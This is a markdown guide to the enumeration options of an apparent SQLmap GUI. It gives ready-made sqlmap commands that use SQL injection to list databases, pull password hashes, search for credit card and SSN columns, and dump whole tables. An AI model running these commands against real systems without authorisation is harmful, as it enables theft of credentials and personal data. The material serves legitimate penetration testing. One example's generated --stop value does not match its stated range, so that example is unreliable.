# Enumeration Tab - Database Structure Discovery and Data Extraction

The Enumeration tab controls how SQLmap discovers and extracts database structure and content, including tables, columns, data, and system information.

## 📋 Overview

The Enumeration tab contains five main sections:
1. **Database Enumeration** - Database and table discovery
2. **Table Enumeration** - Column and structure discovery
3. **Data Enumeration** - Content extraction
4. **System Information** - Database system details
5. **Advanced Options** - Enumeration customization

## 🗄️ Database Enumeration Options

### Enumerate DBMS Databases
**Parameter:** `--dbs`
**Description:** Enumerate all databases on the DBMS
**Output:** List of all accessible databases
**Use Cases:**
- Initial reconnaissance
- Multi-database systems
- Database discovery

### Enumerate DBMS Database Tables
**Parameter:** `--tables`
**Description:** Enumerate tables in specified database
**Requires:** `-D DBNAME` (database name)
**Output:** List of all tables in the database
**Examples:**
```
--tables -D mysql
--tables -D information_schema
--tables -D users_db
```

### Enumerate DBMS Database Table Columns
**Parameter:** `--columns`
**Description:** Enumerate columns in specified table
**Requires:** `-D DBNAME -T TABLENAME`
**Output:** Column names, data types, and properties
**Examples:**
```
--columns -D mysql -T user
--columns -D information_schema -T tables
--columns -D app_db -T users
```

### Enumerate DBMS Users
**Parameter:** `--users`
**Description:** Enumerate database users
**Output:** List of database user accounts
**Use Cases:**
- User account discovery
- Privilege escalation planning
- Access control assessment

### Enumerate DBMS User Password Hashes
**Parameter:** `--passwords`
**Description:** Enumerate user password hashes
**Output:** Username and password hash pairs
**Use Cases:**
- Password cracking
- Security assessment
- Credential analysis

### Enumerate DBMS User Privileges
**Parameter:** `--privileges`
**Description:** Enumerate user privileges
**Output:** User permissions and roles
**Use Cases:**
- Privilege assessment
- Access control review
- Security auditing

### Enumerate DBMS User Roles
**Parameter:** `--roles`
**Description:** Enumerate user roles
**Output:** User role assignments
**Use Cases:**
- Role-based access control
- Permission analysis
- User management review

## 📊 Table and Column Enumeration

### Database Name to Enumerate
**Parameter:** `-D DBNAME`
**Description:** Specify database for enumeration
**Examples:**
```
-D mysql
-D information_schema
-D app_database
-D master
```

### Table Name to Enumerate
**Parameter:** `-T TABLENAME`
**Description:** Specify table for enumeration
**Examples:**
```
-T users
-T admin_users
-T user_credentials
-T system_tables
```

### Column Name to Enumerate
**Parameter:** `-C COLUMNNAME`
**Description:** Specify column for enumeration
**Examples:**
```
-C username,password
-C email,phone
-C id,name,status
-C credit_card,expiry
```

### Enumerate Number of Entries
**Parameter:** `--count`
**Description:** Get row count for tables
**Output:** Number of records in specified table
**Use Cases:**
- Data volume assessment
- Performance planning
- Storage analysis

## 📋 Data Extraction Options

### Dump DBMS Database Table Entries
**Parameter:** `--dump`
**Description:** Dump all entries from specified table
**Requires:** `-D DBNAME -T TABLENAME`
**Output:** All table data in CSV format
**Examples:**
```
--dump -D app_db -T users
--dump -D mysql -T user
--dump -D information_schema -T tables
```

### Dump All DBMS Databases Tables Entries
**Parameter:** `--dump-all`
**Description:** Dump all tables from all databases
**Output:** Complete database dump
**Warning:** Can be very large and time-consuming
**Use Cases:**
- Full database backup
- Complete data extraction
- Forensic analysis

### Dump Only Specific Columns
**Parameter:** `--dump -C COLUMNS`
**Description:** Dump only specified columns
**Examples:**
```
--dump -D app_db -T users -C username,email
--dump -D mysql -T user -C User,Password
--dump -C id,name,status
```

### Start From Entry Number
**Parameter:** `--start=START`
**Description:** Start dumping from specific row number
**Examples:**
```
--start=100
--start=1000
--start=50000
```
**Use Cases:**
- Resume interrupted dumps
- Large table handling
- Memory management

### End At Entry Number
**Parameter:** `--stop=STOP`
**Description:** Stop dumping at specific row number
**Examples:**
```
--stop=1000
--stop=50000
--stop=100000
```
**Use Cases:**
- Limit dump size
- Sample data extraction
- Resource management

## 🔧 Advanced Enumeration Options

### Search for Column(s) Across Databases
**Parameter:** `--search -C COLUMNNAME`
**Description:** Search for columns across all databases
**Examples:**
```
--search -C password
--search -C email
--search -C credit_card
```
**Use Cases:**
- Sensitive data discovery
- Schema analysis
- Data mapping

### Search for Table(s) Across Databases
**Parameter:** `--search -T TABLENAME`
**Description:** Search for tables across all databases
**Examples:**
```
--search -T users
--search -T admin
--search -T config
```
**Use Cases:**
- Table discovery
- Schema mapping
- Application analysis

### Brute-Force Table Names
**Parameter:** `--common-tables`
**Description:** Brute-force common table names
**Behavior:** Tests common table names like users, admin, config
**Use Cases:**
- Unknown schema discovery
- Common application patterns
- Quick reconnaissance

### Brute-Force Column Names
**Parameter:** `--common-columns`
**Description:** Brute-force common column names
**Behavior:** Tests common column names like id, name, password
**Use Cases:**
- Unknown column discovery
- Standard field identification
- Schema reconstruction

## 📝 Usage Examples

### Basic Database Discovery
```
Enumerate Databases: ✓ Enabled
Enumerate Users: ✓ Enabled
Enumerate Passwords: ✓ Enabled
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/page.php?id=1" --dbs --users --passwords
```

### Table Structure Analysis
```
Database: mysql
Enumerate Tables: ✓ Enabled
Enumerate Columns: ✓ Enabled
Table: user
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/admin.php?id=1" -D mysql --tables --columns -T user
```

### Data Extraction
```
Database: app_db
Table: users
Dump Table: ✓ Enabled
Columns: username,password,email
Start from: 1
Stop at: 1000
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/user.php?id=1" -D app_db -T users --dump -C username,password,email --start=1 --stop=1000
```

### Complete Database Dump
```
Dump All Databases: ✓ Enabled
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/db.php?id=1" --dump-all
```

### Sensitive Data Search
```
Search Columns: password,credit_card,ssn
Search Tables: users,admin,customers
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/search.php?q=test" --search -C password,credit_card,ssn --search -T users,admin,customers
```

### Large Table Handling
```
Database: logs
Table: access_logs
Dump Table: ✓ Enabled
Start from: 100000
Stop at: 200000
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/logs.php?id=1" -D logs -T access_logs --dump --start=100000 --stop=100000
```

## ⚠️ Important Considerations

### Database Selection Strategy
- **Start with system databases**: mysql, information_schema, master
- **Check application databases**: Look for app-specific databases
- **Consider permissions**: Some databases may not be accessible
- **Multi-tenant systems**: May have separate databases per tenant

### Table Discovery Approach
- **Use --tables first**: Get complete table list
- **Common table names**: users, admin, config, settings
- **Application-specific**: Look for tables matching app functionality
- **System tables**: Contain metadata and system information

### Data Extraction Planning
- **Start small**: Test with single table first
- **Use limits**: --start and --stop for large tables
- **Consider storage**: Dumps can be very large
- **Privacy concerns**: Handle sensitive data appropriately

### Performance Considerations
- **Large databases**: Use --start/--stop to chunk data
- **Network limits**: Consider bandwidth and time constraints
- **Memory usage**: Large dumps require significant memory
- **Resume capability**: Use --start to resume interrupted dumps

## 🔧 Troubleshooting

### No Databases Found
**Problem:** --dbs returns no results
**Solutions:**
1. Check user privileges
2. Try different injection techniques
3. Use --users to verify database access
4. Check if DBMS supports multiple databases

### Table Enumeration Failing
**Problem:** --tables not working on specific database
**Solutions:**
1. Verify database name spelling
2. Check user permissions on database
3. Try different case sensitivity
4. Use --search for table discovery

### Column Discovery Issues
**Problem:** --columns not returning expected results
**Solutions:**
1. Verify table name exists
2. Check column name case sensitivity
3. Use --search -C for column discovery
4. Try --common-columns for brute force

### Data Dump Too Large
**Problem:** Dump files becoming too large
**Solutions:**
1. Use --start and --stop to chunk data
2. Specify only needed columns: -C col1,col2
3. Use --count first to assess table size
4. Consider sampling instead of full dump

### Permission Denied Errors
**Problem:** Access denied on certain databases/tables
**Solutions:**
1. Check current user privileges: --privileges
2. Try different user accounts if available
3. Use --users to find privileged accounts
4. Consider privilege escalation techniques

### Slow Enumeration
**Problem:** Enumeration taking too long
**Solutions:**
1. Use --common-tables instead of full enumeration
2. Limit scope to specific databases
3. Use --search for targeted discovery
4. Enable optimization options

## 📚 Related Tabs

- **[Fingerprint Tab](fingerprint.md)**: Database type and version identification
- **[File System Tab](filesystem.md)**: File system access and file operations
- **[OS Access Tab](os_access.md)**: Operating system command execution
- **[General Tab](general.md)**: Output and logging options</content>
<parameter name="filePath">/home/devil/Desktop/SQLmap-GUI-Advanced-SQL-Injection-Testing-Interface/docs/tabs/enumeration.md
